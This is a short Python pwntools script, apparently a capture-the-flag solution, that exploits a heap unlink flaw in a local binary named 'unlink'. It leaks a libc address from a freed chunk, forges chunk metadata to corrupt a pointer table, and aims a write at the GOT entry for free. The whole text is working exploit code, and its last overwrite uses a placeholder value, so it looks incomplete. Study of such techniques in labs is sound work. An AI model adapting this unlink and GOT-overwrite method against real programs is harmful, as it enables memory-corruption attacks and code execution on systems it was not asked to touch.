from pwn import *

p=process('./unlink')
elf=ELF('./unlink')

context.log_level='debug'
#gdb.attach(p)

n=2
chunk_addr=0x8049D60+4*n

def rv(s):
  p.recvuntil(s)

def sd(s):
  p.sendline(s)

def add(size):
  rv('Exit\n')
  sd('1')
  rv('add:')
  sd(str(size))

def setc(index,content):
  rv('Exit\n')
  sd('2')
  rv('index:')
  sd(str(index))
  rv('data:')
  p.send(content)

def dele(index):
  rv('Exit\n')
  sd('3')
  rv('index:')
  sd(str(index))

def show(index):
  rv('Exit\n')
  sd('4')
  rv('index:')
  sd(str(index))

add(0x100)
add(0x100)

dele(0)
show(0)

libc_base=u32(p.recvline()[0:4])-0x1b27b0

log.info(hex(libc_base))

dele(1)

#clear------------------------------------------- 
#start with index 2

add(0x100)
add(0x100)
add(0x100)

payload=p32(0)+p32(0)
payload+=p32(chunk_addr-12)+p32(chunk_addr-8)
payload+=(0x100-len(payload))*'a'
payload+=p32(0x100)+p32(0x108)

setc(2,payload)

dele(3)

setc(2,'a'*12+p32(elf.got['free']))
setc(2,'aaaa')

dele(3)

p.interactive()
